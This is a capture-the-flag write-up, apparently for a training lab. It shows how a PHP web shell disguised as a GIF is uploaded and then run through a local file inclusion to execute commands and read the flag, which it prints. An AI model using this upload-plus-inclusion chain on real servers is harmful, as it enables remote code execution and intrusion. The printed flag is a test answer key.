## Challenge

Use any of the techniques covered in this section to gain RCE and read the flag at /

## Solution

In the webpage there is an option `Profile Settings`.

There is a function that allows to upload the profile image:

Let's start by creating a gif image:

`echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`

And after that I uploaded the gif file to the site. 

I right click on the image (there is nothing shown as that's not a real image), and open it to an new page, the url becomes:

`http://94.237.54.116:58190/profile_images/shell.gif`

So now I know the path to the "picture".

I change the language and the url is:

`http://94.237.54.116:58190/index.php?language=es.php`

I point out to the directory where the image is:

`http://94.237.54.116:58190/index.php?language=./profile_images/shell.gif&cmd=id`

and the result now is:

`GIF8uid=33(www-data) gid=33(www-data) groups=33(www-data)`

Let's list the files at the root directory:

`http://94.237.54.116:58190/index.php?language=./profile_images/shell.gif&cmd=ls%20/`

There is a file called `GIF82f40d853e2d4768d87da1c81772bae0a.txt` and I `cat` to that file:

The flag is `HTB{upl04d+lf!+3x3cut3=rc3}` and the lab is solved.

